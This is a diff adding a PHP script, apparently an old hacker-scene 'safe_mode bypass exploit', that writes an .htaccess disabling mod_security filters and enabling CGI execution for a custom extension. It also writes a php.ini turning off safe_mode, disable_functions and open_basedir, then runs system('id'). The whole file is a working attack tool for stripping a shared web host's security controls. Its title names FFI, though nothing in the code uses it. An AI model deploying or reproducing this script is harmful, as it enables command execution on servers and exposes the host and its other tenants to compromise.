@@ -1,0 +1,45 @@
+<?php
+##########################################################
+###----------------------------------------------------###
+###-----PHP FFI Extension Safe_mode Bypass Exploit-----###
+###----------------------------------------------------###
+###-Tested on 5.2.12 & Tested on 5.2.17----------------###
+###----------------------------------------------------###
+###-Author:--CiH_H@CkErZ-------------------------------###
+###-Email:---cih_hacker[at]yahoo[dot]com---------------###
+###-Website:-http://cihiq.com-------------------------###
+###----------------------------------------------------###
+##########################################################
+
+$fp2 = fopen(".htaccess","w+");
+fwrite($fp2,"<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+SecFilterCheckURLEncoding Off
+SecFilterCheckCookieFormat Off
+SecFilterCheckUnicodeEncoding Off
+SecFilterNormalizeCookies Off
+</IfModule>
+
+Options FollowSymLinks MultiViews Indexes ExecCGI
+DirectoryIndex Index.html
+Options +Indexes
+
+AddType application/x-httpd-cgi .cih
+
+AddHandler cgi-script .cih
+AddHandler cgi-script .cih");
+echo "<BR>make .htaccess >>>> Done ,,,<BR>======<BR>";
+
+$fp = fopen("php.ini","w+");
+fwrite($fp,"safe_mode = Off
+disable_functions = NONE
+safe_mode_gid = OFF
+open_basedir = OFF ");
+echo "<BR> make php.ini >>>> Done ,,,<BR>======<BR>";
+
+echo "<BR>Mode security = off & safe Mode = off,,,<BR>======<BR>";
+
+system("id");
+#EOF
+?>
